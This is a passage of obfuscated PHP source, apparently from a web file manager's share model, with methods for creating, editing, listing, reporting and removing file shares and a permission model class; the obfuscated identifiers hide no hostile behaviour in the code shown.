$ŒœÅ½¸Æ = $this->where($ÚÔß™Æ–)->selectPage($õ›è„ğ£); return $ŒœÅ½¸Æ; } protected function listToMe($ËÜ¨Œú = 300) { $‹®µü‡® =& $_SERVER[Ôó‡è­ƒ]; $›å‘­¼‡ = Model($‹®µü‡®[1966])->userGroupParents(USER_ID); $Üü³äÆ‹ = array($‹®µü‡®[579] => SourceModel::TYPE_USER, $‹®µü‡®[501] => USER_ID); if ($›å‘­¼‡) { $Üü³äÆ‹ = array(array($‹®µü‡®[579] => SourceModel::TYPE_USER, $‹®µü‡®[501] => USER_ID), array($‹®µü‡®[579] => SourceModel::TYPE_GROUP, $‹®µü‡®[501] => array($‹®µü‡®[7], $›å‘­¼‡)), $‹®µü‡®[1964] => $‹®µü‡®[1920]); } $š¦ºí¶  = Model($‹®µü‡®[595])->where($Üü³äÆ‹)->selectPage($ËÜ¨Œú); $ Ú€ = array_to_keyvalue_group($š¦ºí¶ [$‹®µü‡®[368]], $‹®µü‡®[484]); if (!$ Ú€) { return $š¦ºí¶ ; } $««ò¹¦ã = $‹®µü‡®[1967]; $Üü³äÆ‹ = array($‹®µü‡®[484] => array($‹®µü‡®[415], array_keys($ Ú€)), $‹®µü‡®[1655] => array($‹®µü‡®[1014], $‹®µü‡®[194])); $Ñ‘™„ëë = $this->field($««ò¹¦ã)->where($Üü³äÆ‹)->select(); foreach ($Ñ‘™„ëë as $Ì“‰ªÕ => &$øàü†ê) { $øàü†ê[$‹®µü‡®[1963]] = $ Ú€[$øàü†ê[$‹®µü‡®[484]]]; } unset($øàü†ê); $ÉñÖ…–ï = array($‹®µü‡®[1968] => $Ñ‘™„ëë, $‹®µü‡®[1969] => $š¦ºí¶ [$‹®µü‡®[365]]); return $ÉñÖ…–ï; } protected function shareAdd($àğˆ“Õ±, $˜Ã££‚î) { $†çÎ÷À˜ =& $_SERVER[Ôó‡è­ƒ]; $‘İÜŒ•Ë = $this->_addShareData($àğˆ“Õ±, $˜Ã££‚î); if (!empty($˜Ã££‚î[$†çÎ÷À˜[1970]])) { $this->_shareAuthSet($‘İÜŒ•Ë, $˜Ã££‚î[$†çÎ÷À˜[1970]]); } $this->shareEventAdd($àğˆ“Õ±, $˜Ã££‚î, $†çÎ÷À˜[1162]); return $‘İÜŒ•Ë; } protected function shareAddSystem($õ¬“¹ˆô, $é¿» û£) { $ôî¾÷æö =& $_SERVER[Ôó‡è­ƒ]; $¯îÂ¹İ£ = $this->_addShareData($õ¬“¹ˆô, $é¿» û£, $ôî¾÷æö[1274]); $this->_shareAuthSet($¯îÂ¹İ£, $é¿» û£[$ôî¾÷æö[1970]]); return $¯îÂ¹İ£; } private function shareEventAdd($ÛçÏş÷Ä, $ÕÖÍ­Ä, $ãéÁòœ÷ = "\x61\144\x64") { $úõµª’Ì =& $_SERVER[Ôó‡è­ƒ]; if (!$ÛçÏş÷Ä || $ÛçÏş÷Ä == $úõµª’Ì[194]) { return; } if ($ãéÁòœ÷ == $úõµª’Ì[1162]) { if ($ÕÖÍ­Ä[$úõµª’Ì[489]] == $úõµª’Ì[89]) { Model($úõµª’Ì[563])->eventShare($ÛçÏş÷Ä, $úõµª’Ì[1971]); } if ($ÕÖÍ­Ä[$úõµª’Ì[491]] == $úõµª’Ì[89]) { Model($úõµª’Ì[563])->eventShare($ÛçÏş÷Ä, $úõµª’Ì[1972]); } return; } $¶Ë»ó‘§ = $this->getInfoByPath($ÛçÏş÷Ä); $ı¯‘»æ÷ = $úõµª’Ì[1973]; if ($¶Ë»ó‘§[$úõµª’Ì[489]] == $úõµª’Ì[194] && $ÕÖÍ­Ä[$úõµª’Ì[489]] == $úõµª’Ì[89]) { $ı¯‘»æ÷ = $úõµª’Ì[1971]; } if ($¶Ë»ó‘§[$úõµª’Ì[489]] == $úõµª’Ì[89] && $ÕÖÍ­Ä[$úõµª’Ì[489]] == $úõµª’Ì[194]) { $ı¯‘»æ÷ = $úõµª’Ì[1974]; } if ($¶Ë»ó‘§[$úõµª’Ì[491]] == $úõµª’Ì[194] && $ÕÖÍ­Ä[$úõµª’Ì[491]] == $úõµª’Ì[89]) { $ı¯‘»æ÷ = $úõµª’Ì[1972]; } if ($¶Ë»ó‘§[$úõµª’Ì[491]] == $úõµª’Ì[89] && $ÕÖÍ­Ä[$úõµª’Ì[491]] == $úõµª’Ì[194]) { $ı¯‘»æ÷ = $úõµª’Ì[1975]; } Model($úõµª’Ì[563])->eventShare($ÛçÏş÷Ä, $ı¯‘»æ÷); return; } private function _addShareData($êğËä„, $‘ı„„×­ = array(), $ØÎšøÅğ = false) { $»ü¦Ïå =& $_SERVER[Ôó‡è­ƒ]; $ØÛ“õùá = $ØÎšøÅğ == $»ü¦Ïå[1274] ? 0 : USER_ID; $ÜÅŠëğ = array($»ü¦Ïå[414] => $êğËä„, $»ü¦Ïå[1646] => $ØÛ“õùá); if ($êğËä„ == 0) { $ÜÅŠëğ = array($»ü¦Ïå[1976] => $‘ı„„×­[$»ü¦Ïå[1174]], $»ü¦Ïå[1646] => $ØÛ“õùá); } if ($şÌÉ‰¡ˆ = $this->where($ÜÅŠëğ)->find()) { return $şÌÉ‰¡ˆ[$»ü¦Ïå[484]]; } if ($êğËä„ == 0) { $şß—‚ÔÍ = array($»ü¦Ïå[32] => get_path_this($‘ı„„×­[$»ü¦Ïå[78]])); } else { $şß—‚ÔÍ = Model($»ü¦Ïå[823])->sourceInfo($êğËä„); if (!$şß—‚ÔÍ) { return !1; } } if (!$‘ı„„×­[$»ü¦Ïå[1555]]) { $‘ı„„×­[$»ü¦Ïå[1555]] = $şß—‚ÔÍ[$»ü¦Ïå[32]]; } $¥‘ç¸öŒ = array($»ü¦Ïå[1646] => $ØÛ“õùá, $»ü¦Ïå[414] => $êğËä„, $»ü¦Ïå[1555] => $»ü¦Ïå[12], $»ü¦Ïå[489] => 0, $»ü¦Ïå[491] => 0, $»ü¦Ïå[1174] => $»ü¦Ïå[12], $»ü¦Ïå[306] => $»ü¦Ïå[12], $»ü¦Ïå[889] => $»ü¦Ïå[12], $»ü¦Ïå[1977] => 0, $»ü¦Ïå[1978] => 0, $»ü¦Ïå[492] => 0, $»ü¦Ïå[493] => $»ü¦Ïå[12], $»ü¦Ïå[486] => $»ü¦Ïå[12]); $ßÌëğï… = explode($»ü¦Ïå[50], $»ü¦Ïå[1979]); foreach ($ßÌëğï… as $Ò”û´) { if (!isset($‘ı„„×­[$Ò”û´])) { continue; } $¥‘ç¸öŒ[$Ò”û´] = $‘ı„„×­[$Ò”û´]; } $ŸÃ„Œ×ß = $this->add($¥‘ç¸öŒ); $ßÏÏ£¨ = array($»ü¦Ïå[486] => short_id($ŸÃ„Œ×ß)); $this->where(array($»ü¦Ïå[483] => $ŸÃ„Œ×ß))->save($ßÏÏ£¨); return $ŸÃ„Œ×ß; } private function _shareAuthSet($ÊÜÉ€ƒ‰, $Ïİ·÷À ) { $ëÌÑä®š =& $_SERVER[Ôó‡è­ƒ]; if (!is_array($Ïİ·÷À )) { return !1; } $õ–›Ø£ = Model($ëÌÑä®š[1930]); $õ–›Ø£->where(array($ëÌÑä®š[484] => $ÊÜÉ€ƒ‰))->delete(); $À„µ¼×“ = array(); foreach ($Ïİ·÷À  as $ìÈ´ëêò) { $­õ«Ôòõ = SourceModel::TYPE_USER; if ($ìÈ´ëêò[$ëÌÑä®š[408]] == SourceModel::TYPE_GROUP) { $­õ«Ôòõ = SourceModel::TYPE_GROUP; } $ä¤æÀç = array($ëÌÑä®š[484] => $ÊÜÉ€ƒ‰, $ëÌÑä®š[408] => $­õ«Ôòõ, $ëÌÑä®š[501] => intval($ìÈ´ëêò[$ëÌÑä®š[501]]), $ëÌÑä®š[1926] => 0, $ëÌÑä®š[1980] => -1); if ($ìÈ´ëêò[$ëÌÑä®š[1926]]) { $ä¤æÀç[$ëÌÑä®š[1926]] = $ìÈ´ëêò[$ëÌÑä®š[1926]]; } else { if ($ìÈ´ëêò[$ëÌÑä®š[1980]]) { $ä¤æÀç[$ëÌÑä®š[1980]] = $ìÈ´ëêò[$ëÌÑä®š[1980]]; } } $À„µ¼×“[] = $ä¤æÀç; } return $õ–›Ø£->addAll($À„µ¼×“, array(), !0); } public function numViewAdd($±Ü¿…Õ­) { $¹úŒÇ¨¾ =& $_SERVER[Ôó‡è­ƒ]; $Ê¹õ¶üÚ = array($¹úŒÇ¨¾[483] => $±Ü¿…Õ­); $this->where($Ê¹õ¶üÚ)->setAdd($¹úŒÇ¨¾[1977]); } public function numDownloadAdd($ç˜ôò¡š) { $ú†¹Ò¥© =& $_SERVER[Ôó‡è­ƒ]; $ÏÎ¯Ÿ¾ = array($ú†¹Ò¥©[483] => $ç˜ôò¡š); $this->where($ÏÎ¯Ÿ¾)->setAdd($ú†¹Ò¥©[1978]); } protected function shareEdit($­Û•ôîÍ, $‰ú­“¨¼) { $Ôôá†¡¨ =& $_SERVER[Ôó‡è­ƒ]; $ê‡¡êÉ™ = $this->getInfo($­Û•ôîÍ); if (!$ê‡¡êÉ™) { return !1; } $this->_checkLinkShare($‰ú­“¨¼, $ê‡¡êÉ™); $»Ï„‹è± = array(); $İĞ±­•¯ = explode($Ôôá†¡¨[50], $Ôôá†¡¨[1981]); foreach ($İĞ±­•¯ as $ŸĞÔº«‹) { if (!array_key_exists($ŸĞÔº«‹, $‰ú­“¨¼)) { continue; } $»Ï„‹è±[$ŸĞÔº«‹] = $‰ú­“¨¼[$ŸĞÔº«‹]; } $this->shareEventAdd($ê‡¡êÉ™[$Ôôá†¡¨[399]], $‰ú­“¨¼, $Ôôá†¡¨[1793]); $this->where(array($Ôôá†¡¨[483] => $­Û•ôîÍ))->save($»Ï„‹è±); if (isset($‰ú­“¨¼[$Ôôá†¡¨[1970]])) { $this->_shareAuthSet($­Û•ôîÍ, $‰ú­“¨¼[$Ôôá†¡¨[1970]]); } return !0; } private function _checkLinkShare($”¤­áá­, $„‘¤§ª) { $îÌ¡õ• =& $_SERVER[Ôó‡è­ƒ]; if ($”¤­áá­[$îÌ¡õ•[489]] != $îÌ¡õ•[89]) { return; } $ª´æ´¸° = $„‘¤§ª[$îÌ¡õ•[87]][$îÌ¡õ•[399]]; if ($„‘¤§ª[$îÌ¡õ•[87]][$îÌ¡õ•[33]] != $îÌ¡õ•[196]) { $Åö–ºÅ„ = $this->_folderReport($ª´æ´¸°); if (!$Åö–ºÅ„) { return; } show_json(LNG($îÌ¡õ•[1982]) . $îÌ¡õ•[1983] . $Åö–ºÅ„, !1); } $¯œõá´ = Model($îÌ¡õ•[823])->fileInfoGet($„‘¤§ª[$îÌ¡õ•[87]][$îÌ¡õ•[399]]); if (!$¯œõá´) { return; } $äÓ’¨ = $this->shareFileMeta($¯œõá´[$îÌ¡õ•[463]]); if (isset($äÓ’¨[$îÌ¡õ•[373]]) && $äÓ’¨[$îÌ¡õ•[373]] == $îÌ¡õ•[89]) { show_json(LNG($îÌ¡õ•[1984]), !1); } } private function _folderReport($´ˆÚÉÌ«) { $¢²ÕØœì =& $_SERVER[Ôó‡è­ƒ]; $¾¼±‘Ìà = array($¢²ÕØœì[463] => array($¢²ÕØœì[1012], 0), $¢²ÕØœì[748] => 3); $¨ªîÒàÀ = Model($¢²ÕØœì[1985])->where($¾¼±‘Ìà)->field($¢²ÕØœì[463])->select(); if (!$¨ªîÒàÀ) { return !1; } $¨ªîÒàÀ = array_to_keyvalue($¨ªîÒàÀ, $¢²ÕØœì[12], $¢²ÕØœì[463]); $»¬ÆÎ©à = $¢²ÕØœì[50] . $´ˆÚÉÌ« . $¢²ÕØœì[50]; $¾¼±‘Ìà = array($¢²ÕØœì[463] => array($¢²ÕØœì[7], $¨ªîÒàÀ), $¢²ÕØœì[517] => array($¢²ÕØœì[382], "\x25{$»¬ÆÎ©à}\x25"), $¢²ÕØœì[427] => 0); $Á ¿·‹Ì = Model($¢²ÕØœì[823])->where($¾¼±‘Ìà)->field($¢²ÕØœì[1986])->find(); if (!$Á ¿·‹Ì) { return !1; } $»«üê¾Í = substr($Á ¿·‹Ì[$¢²ÕØœì[517]], strpos($Á ¿·‹Ì[$¢²ÕØœì[517]], $»¬ÆÎ©à)); $¾¼±‘Ìà = array($¢²ÕØœì[399] => array($¢²ÕØœì[7], trim($»«üê¾Í, $¢²ÕØœì[50]))); $ò…ŞÎ õ = Model($¢²ÕØœì[823])->where($¾¼±‘Ìà)->field($¢²ÕØœì[32])->select(); $ú¨ÕÒ÷× = array_to_keyvalue($ò…ŞÎ õ, $¢²ÕØœì[12], $¢²ÕØœì[32]); $ú¨ÕÒ÷×[] = $Á ¿·‹Ì[$¢²ÕØœì[32]]; return implode($¢²ÕØœì[8], $ú¨ÕÒ÷×); } protected function remove($æüÏï·£) { $ÑÉ˜¿Ì« =& $_SERVER[Ôó‡è­ƒ]; if (is_array($æüÏï·£)) { $æüÏï·£ = array($ÑÉ˜¿Ì«[7], $æüÏï·£); } $›’ğÂØÚ = array($ÑÉ˜¿Ì«[484] => $æüÏï·£); $ùÈœşõ™ = $this->where($›’ğÂØÚ)->delete(); if ($ùÈœşõ™) { Model($ÑÉ˜¿Ì«[595])->where(array($ÑÉ˜¿Ì«[484] => $æüÏï·£))->delete(); } $¤âìéòñ = is_array($æüÏï·£) ? $æüÏï·£[1] : array($æüÏï·£); for ($ƒçÏïË = 0; $ƒçÏïË < count($¤âìéòñ); $ƒçÏïË++) { $‡Ú½ó¸« = $this->getInfo($¤âìéòñ[$ƒçÏïË]); if ($‡Ú½ó¸«[$ÑÉ˜¿Ì«[491]] == $ÑÉ˜¿Ì«[89]) { Model($ÑÉ˜¿Ì«[563])->eventShare($‡Ú½ó¸«[$ÑÉ˜¿Ì«[399]], $ÑÉ˜¿Ì«[1975]); } if ($‡Ú½ó¸«[$ÑÉ˜¿Ì«[489]] == $ÑÉ˜¿Ì«[89]) { Model($ÑÉ˜¿Ì«[563])->eventShare($‡Ú½ó¸«[$ÑÉ˜¿Ì«[399]], $ÑÉ˜¿Ì«[1974]); } } return $ùÈœşõ™; } protected function removeBySource($óß¢ºøè) { $Æ‹™˜–  =& $_SERVER[Ôó‡è­ƒ]; $»ÚÛÛ©ì = array($Æ‹™˜– [414] => array($Æ‹™˜– [415], $óß¢ºøè)); $ä±×Ô = $this->field($Æ‹™˜– [484])->where($»ÚÛÛ©ì)->select(); $ä±×Ô = array_to_keyvalue($ä±×Ô, $Æ‹™˜– [12], $Æ‹™˜– [484]); if (!$ä±×Ô) { return; } $»ÚÛÛ©ì = array($Æ‹™˜– [483] => array($Æ‹™˜– [415], $ä±×Ô)); $this->where($»ÚÛÛ©ì)->delete(); Model($Æ‹™˜– [595])->where($»ÚÛÛ©ì)->delete(); } public function listAll($…¦‘˜Äô) { $è³·ÙÓ• =& $_SERVER[Ôó‡è­ƒ]; $–üü«µã = array(); if ($…¦‘˜Äô[$è³·ÙÓ•[1655]]) { $–üü«µã[$è³·ÙÓ•[1655]] = $…¦‘˜Äô[$è³·ÙÓ•[1655]]; } if ($…¦‘˜Äô[$è³·ÙÓ•[759]]) { $Óë©×ÄÌ = $…¦‘˜Äô[$è³·ÙÓ•[492]] ? $…¦‘˜Äô[$è³·ÙÓ•[492]] : strtotime(date($è³·ÙÓ•[1987])); $–üü«µã[$è³·ÙÓ•[197]] = array($è³·ÙÓ•[332], array($…¦‘˜Äô[$è³·ÙÓ•[759]], $Óë©×ÄÌ)); } if ($…¦‘˜Äô[$è³·ÙÓ•[33]]) { $–üü«µã[$…¦‘˜Äô[$è³·ÙÓ•[33]]] = 1; } else { $–üü«µã[] = array($è³·ÙÓ•[489] => array($è³·ÙÓ•[1012], 0), $è³·ÙÓ•[491] => array($è³·ÙÓ•[1012], 0), $è³·ÙÓ•[1964] => $è³·ÙÓ•[1920]); } if ($…¦‘˜Äô[$è³·ÙÓ•[1916]]) { $–üü«µã[] = array($è³·ÙÓ•[486] => $…¦‘˜Äô[$è³·ÙÓ•[1916]], $è³·ÙÓ•[1555] => array($è³·ÙÓ•[382], "\45{$…¦‘˜Äô[$è³·ÙÓ•[1916]]}\x25"), $è³·ÙÓ•[1964] => $è³·ÙÓ•[1920]); } $œŠ„µê = $this->_makeOrder()->where($–üü«µã)->selectPage(20); if (empty($œŠ„µê[$è³·ÙÓ•[368]])) { return array(); } $this->_listDataApply($œŠ„µê[$è³·ÙÓ•[368]]); return $œŠ„µê; } public function listDataApply($•ˆ¿Õ‘) { $this->_listDataApply($•ˆ¿Õ‘); return $•ˆ¿Õ‘; } private function _listDataApply(&$Íä¾¢¼‚) { $½Æ»ò‘‚ =& $_SERVER[Ôó‡è­ƒ]; $‹ˆ“„‘± = array_to_keyvalue($Íä¾¢¼‚, $½Æ»ò‘‚[12], $½Æ»ò‘‚[1655]); $ŠŠíö‚± = Model($½Æ»ò‘‚[537])->userListInfo(array_unique($‹ˆ“„‘±)); $ÄÕŒÙóŞ = array_to_keyvalue($Íä¾¢¼‚, $½Æ»ò‘‚[12], $½Æ»ò‘‚[399]); $³ÈÖˆÔÌ = Model($½Æ»ò‘‚[823])->sourceListInfo($ÄÕŒÙóŞ, !0); foreach ($Íä¾¢¼‚ as $½€ë¤— => &$å£«Ú·ù) { $ÙôÕÍ©Ì = $å£«Ú·ù[$½Æ»ò‘‚[1655]]; $å£«Ú·ù[$½Æ»ò‘‚[1988]] = $ŠŠíö‚±[$ÙôÕÍ©Ì] ? $ŠŠíö‚±[$ÙôÕÍ©Ì] : !1; $¤Ô“Íº– = $å£«Ú·ù[$½Æ»ò‘‚[399]]; $å£«Ú·ù[$½Æ»ò‘‚[87]] = $³ÈÖˆÔÌ[$¤Ô“Íº–] ? $³ÈÖˆÔÌ[$¤Ô“Íº–] : !1; if ($å£«Ú·ù[$½Æ»ò‘‚[87]][$½Æ»ò‘‚[427]] == $½Æ»ò‘‚[89]) { unset($Íä¾¢¼‚[$½€ë¤—]); } if ($å£«Ú·ù[$½Æ»ò‘‚[87]] != $½Æ»ò‘‚[194] && !$å£«Ú·ù[$½Æ»ò‘‚[87]]) { unset($Íä¾¢¼‚[$½€ë¤—]); } } unset($å£«Ú·ù); $Íä¾¢¼‚ = array_values($Íä¾¢¼‚); } private function _makeOrder($¨¼•”à’ = '') { $ùÊ©Ş¡– =& $_SERVER[Ôó‡è­ƒ]; $Ú¾š×š¯ = array($ùÊ©Ş¡–[197], $ùÊ©Ş¡–[492], $ùÊ©Ş¡–[1977], $ùÊ©Ş¡–[1978]); $åÉ°Ò”™ = array($ùÊ©Ş¡–[444] => $ùÊ©Ş¡–[445], $ùÊ©Ş¡–[446] => $ùÊ©Ş¡–[447]); $ÒË¯¾µÔ = Input::get($ùÊ©Ş¡–[451], $ùÊ©Ş¡–[7], $ùÊ©Ş¡–[420], $Ú¾š×š¯); $–ğÖ¤¯Ê = Input::get($ùÊ©Ş¡–[452], $ùÊ©Ş¡–[7], $ùÊ©Ş¡–[1989], array($ùÊ©Ş¡–[1913], $ùÊ©Ş¡–[446])); $–ğÖ¤¯Ê = $åÉ°Ò”™[$–ğÖ¤¯Ê]; $¨¼•”à’ = $¨¼•”à’ . "{$ÒË¯¾µÔ}\x20{$–ğÖ¤¯Ê}"; return $this->order($¨¼•”à’); } public function reportAdd($ÔÇ–ìÇ) { $Ş‰ÑÁ¶‡ =& $_SERVER[Ôó‡è­ƒ]; $Øú»Èè = array($Ş‰ÑÁ¶‡[484] => $ÔÇ–ìÇ[$Ş‰ÑÁ¶‡[484]], $Ş‰ÑÁ¶‡[1655] => USER_ID); if (Model($Ş‰ÑÁ¶‡[1985])->where($Øú»Èè)->find()) { return !1; } $°ß¥›å  = array($Ş‰ÑÁ¶‡[484] => $ÔÇ–ìÇ[$Ş‰ÑÁ¶‡[484]], $Ş‰ÑÁ¶‡[1555] => $ÔÇ–ìÇ[$Ş‰ÑÁ¶‡[1555]], $Ş‰ÑÁ¶‡[399] => $ÔÇ–ìÇ[$Ş‰ÑÁ¶‡[399]], $Ş‰ÑÁ¶‡[463] => $ÔÇ–ìÇ[$Ş‰ÑÁ¶‡[463]], $Ş‰ÑÁ¶‡[1655] => USER_ID, $Ş‰ÑÁ¶‡[33] => $ÔÇ–ìÇ[$Ş‰ÑÁ¶‡[33]], $Ş‰ÑÁ¶‡[447] => $ÔÇ–ìÇ[$Ş‰ÑÁ¶‡[447]]); return Model($Ş‰ÑÁ¶‡[1985])->add($°ß¥›å ); } public function reportList($‰¿Ëø» ) { $´×±õº =& $_SERVER[Ôó‡è­ƒ]; $è‹ñÕğï = array(); if ($‰¿Ëø» [$´×±õº[759]]) { $äØË¤Çı = $‰¿Ëø» [$´×±õº[492]] ? $‰¿Ëø» [$´×±õº[492]] : strtotime(date($´×±õº[1987])); $è‹ñÕğï[$´×±õº[197]] = array($´×±õº[332], array($‰¿Ëø» [$´×±õº[759]], $äØË¤Çı)); } if (isset($‰¿Ëø» [$´×±õº[33]]) && in_array($‰¿Ëø» [$´×±õº[33]], array($´×±õº[89], $´×±õº[431], $´×±õº[1990], $´×±õº[1991], $´×±õº[1992]))) { $è‹ñÕğï[$´×±õº[33]] = $‰¿Ëø» [$´×±õº[33]]; } if (isset($‰¿Ëø» [$´×±õº[748]]) && in_array($‰¿Ëø» [$´×±õº[748]], array($´×±õº[194], $´×±õº[89], $´×±õº[431], $´×±õº[1990]))) { $è‹ñÕğï[$´×±õº[748]] = $‰¿Ëø» [$´×±õº[748]]; } $¬®ğ†ª = Input::get($´×±õº[452], $´×±õº[7], $´×±õº[1989], array($´×±õº[1913], $´×±õº[446])); $Ç¢¿îËÙ = array($´×±õº[444] => $´×±õº[445], $´×±õº[446] => $´×±õº[447]); $Ÿ——ş»ê = $´×±õº[1993] . $Ç¢¿îËÙ[$¬®ğ†ª]; $µÀ§Õª = Model($´×±õº[1985])->where($è‹ñÕğï)->order($Ÿ——ş»ê)->selectPage(20); if (empty($µÀ§Õª[$´×±õº[368]])) { return array(); } $Õ°¿•‚ = array_to_keyvalue_group($µÀ§Õª[$´×±õº[368]], $´×±õº[748], $´×±õº[484]); if (!empty($Õ°¿•‚[0])) { $‰¿Ëø»  = $Õ°¿•‚[0]; $è‹ñÕğï = array($´×±õº[484] => array($´×±õº[7], $‰¿Ëø» )); $Š ƒìÜ = $this->where($è‹ñÕğï)->field($´×±õº[484])->select(); $Š ƒìÜ = array_to_keyvalue($Š ƒìÜ, $´×±õº[12], $´×±õº[484]); $²‘”ö¡ú = array_diff($‰¿Ëø» , $Š ƒìÜ); if (!empty($²‘”ö¡ú)) { foreach ($µÀ§Õª[$´×±õº[368]] as $Š‹®¤‡½ => $“ãÏ˜) { if (in_array($“ãÏ˜[$´×±õº[484]], $²‘”ö¡ú)) { unset($µÀ§Õª[$´×±õº[368]][$Š‹®¤‡½]); } } } } $this->_listDataApply($µÀ§Õª[$´×±õº[368]]); return $µÀ§Õª; } public function reportStatus($½°ÍøŠâ) { $â«ı€ó¶ =& $_SERVER[Ôó‡è­ƒ]; $Äó«é—¤ = array($â«ı€ó¶[396] => $½°ÍøŠâ[$â«ı€ó¶[396]]); $ÈâûÏÙš = Model($â«ı€ó¶[1985])->where($Äó«é—¤)->field($â«ı€ó¶[1994])->find(); if (!$ÈâûÏÙš) { return !1; } $¹‰àº¶Â = array($â«ı€ó¶[748] => $½°ÍøŠâ[$â«ı€ó¶[748]]); if ($½°ÍøŠâ[$â«ı€ó¶[748]] == $â«ı€ó¶[1990] && $ÈâûÏÙš[$â«ı€ó¶[748]] == $â«ı€ó¶[1990]) { $¹‰àº¶Â[$â«ı€ó¶[748]] = 0; } $ä¥Ø¶ñ¾ = Model($â«ı€ó¶[1985])->where($Äó«é—¤)->save($¹‰àº¶Â); if ($½°ÍøŠâ[$â«ı€ó¶[748]] == $â«ı€ó¶[431]) { if ($ÈâûÏÙš[$â«ı€ó¶[463]] != $â«ı€ó¶[194] && $this->shareFileMeta($ÈâûÏÙš[$â«ı€ó¶[463]])) { $this->shareFileMeta($ÈâûÏÙš[$â«ı€ó¶[463]], 0); } $this->remove($ÈâûÏÙš[$â«ı€ó¶[484]]); return !0; } if ($ä¥Ø¶ñ¾ && $½°ÍøŠâ[$â«ı€ó¶[748]] == $â«ı€ó¶[1990]) { $ŠøÔ•Ú = $¹‰àº¶Â[$â«ı€ó¶[748]] == $â«ı€ó¶[1990] ? 1 : 0; $this->shareFileMeta($ÈâûÏÙš[$â«ı€ó¶[463]], $ŠøÔ•Ú); $this->removeByFile($ÈâûÏÙš[$â«ı€ó¶[463]]); } return $ä¥Ø¶ñ¾; } private function removeByFile($¤Ü™öÌ) { $æåæ¿ =& $_SERVER[Ôó‡è­ƒ]; $ƒÖ³Ê = Model($æåæ¿[823])->where(array($æåæ¿[463] => $¤Ü™öÌ))->field($æåæ¿[399])->select(); $ŸË¾Ö™ª = array_to_keyvalue($ƒÖ³Ê, $æåæ¿[12], $æåæ¿[399]); $ÇÌªê²ü = array($æåæ¿[399] => array($æåæ¿[7], $ŸË¾Ö™ª), $æåæ¿[489] => 1); $ƒÖ³Ê = $this->where($ÇÌªê²ü)->field($æåæ¿[484])->select(); if (empty($ƒÖ³Ê)) { return; } $Ü¿Û­øÈ = array_to_keyvalue($ƒÖ³Ê, $æåæ¿[12], $æåæ¿[484]); $this->remove($Ü¿Û­øÈ); } private function shareFileMeta($şğîÚù¡, $²¶–ÒÚ = null) { $ú¹óÖ«â =& $_SERVER[Ôó‡è­ƒ]; $¶ó»˜†î = array($ú¹óÖ«â[463] => $şğîÚù¡, $ú¹óÖ«â[95] => $ú¹óÖ«â[1995]); if (is_null($²¶–ÒÚ)) { return Model($ú¹óÖ«â[1996])->where($¶ó»˜†î)->find(); } $¶ó»˜†î[$ú¹óÖ«â[373]] = $²¶–ÒÚ; Model($ú¹óÖ«â[1996])->add($¶ó»˜†î, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\x72\x63\145\137\141\165\164\x68"; public function getAuth($Ïä™»Úø) { $ŒÒú™«‡ =& $_SERVER[Ôó‡è­ƒ]; $÷©ª¶ºè = $this->sourceAuthSelect($Ïä™»Úø); $—…ŞíŞÁ = array(); $õÛ¡…ñ = array(); $ÌÃõƒÍ® = 2 << 25; foreach ($÷©ª¶ºè as $¤¦¯¯‚Ö) { $–¤©ãã¿ = Model($ŒÒú™«‡[503])->listData($¤¦¯¯‚Ö[$ŒÒú™«‡[1926]]); if (!$–¤©ãã¿) { continue; } $—…ŞíŞÁ[] = $¤¦¯¯‚Ö; $â»é½¼ = 0; if ($¤¦¯¯‚Ö[$ŒÒú™«‡[408]] == SourceModel::TYPE_GROUP) { $â»é½¼ = $ÌÃõƒÍ® * 2; } if ($¤¦¯¯‚Ö[$ŒÒú™«‡[408]] == SourceModel::TYPE_USER) { $â»é½¼ = $ÌÃõƒÍ®; } if ($¤¦¯¯‚Ö[$ŒÒú™«‡[408]] == SourceModel::TYPE_USER && $¤¦¯¯‚Ö[$ŒÒú™«‡[501]] == $ŒÒú™«‡[194]) { $â»é½¼ = 0; } $õÛ¡…ñ[] = $–¤©ãã¿[$ŒÒú™«‡[410]] + $â»é½¼; } array_multisort($õÛ¡…ñ, SORT_DESC, $—…ŞíŞÁ); return $—…ŞíŞÁ; } public function sourceAuthSelect($—åÓĞÇ) { $ÇÖØ§µñ =& $_SERVER[Ôó‡è­ƒ]; static $˜ÈÎ¼±œ = array(); $€ÒÀÜæ‹ = is_array($—åÓĞÇ) ? !1 : !0; if ($€ÒÀÜæ‹) { $—åÓĞÇ = array($—åÓĞÇ); } $³Ã¡§Î = array(); foreach ($—åÓĞÇ as $ÄáñÔÀš) { if (isset($˜ÈÎ¼±œ[$ÄáñÔÀš])) { $³Ã¡§Î[$ÄáñÔÀš] = $˜ÈÎ¼±œ[$ÄáñÔÀš]; } } if (count($³Ã¡§Î) == count($—åÓĞÇ)) { return $€ÒÀÜæ‹ ? $³Ã¡§Î[$—åÓĞÇ[0]] : $³Ã¡§Î; } $”‘¬“è = $ÇÖØ§µñ[1997]; $²Ãğüì‘ = array($ÇÖØ§µñ[399] => array($ÇÖØ§µñ[7], $—åÓĞÇ)); $úìüˆÑ£ = $this->field($”‘¬“è)->order($ÇÖØ§µñ[396])->where($²Ãğüì‘)->select(); $µÖÍ„¯ = array_to_keyvalue_group($úìüˆÑ£, $ÇÖØ§µñ[399]); foreach ($—åÓĞÇ as $ÄáñÔÀš) { $˜ÈÎ¼±œ[$ÄáñÔÀš] = $µÖÍ„¯[$ÄáñÔÀš] ? $µÖÍ„¯[$ÄáñÔÀš] : array(); } if ($€ÒÀÜæ‹) { return $úìüˆÑ£; } return $µÖÍ„¯; } public function setAuth($Ú¤î´µŒ, $ÔÅåÕ«Û) { $ÁŞ…ª¬á =& $_SERVER[Ôó‡è­ƒ]; $‰™óÜÂ¨ = Model($ÁŞ…ª¬á[1325])->sourceInfo($Ú¤î´µŒ); if (!$‰™óÜÂ¨) { return !1; } if ($‰™óÜÂ¨[$ÁŞ…ª¬á[408]] != SourceModel::TYPE_GROUP) { return !1; } $åØ…¨ç = 1; $‹¾õá = $‰™óÜÂ¨[$ÁŞ…ª¬á[501]]; if ($‹¾õá != $åØ…¨ç) { $É³—òÒº = array($ÁŞ…ª¬á[1823] => $‹¾õá); $Ï¶ÎÈœã = Model($ÁŞ…ª¬á[1912])->field($ÁŞ…ª¬á[1655])->where($É³—òÒº)->select(); $Ï¶ÎÈœã = array_to_keyvalue($Ï¶ÎÈœã, $ÁŞ…ª¬á[12], $ÁŞ…ª¬á[1655]); } $ ¾§ŞÃ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¨Í²Ì¦ = array(); foreach ($ÔÅåÕ«Û as $®âäš) { if (!in_array($®âäš[$ÁŞ…ª¬á[408]], $ 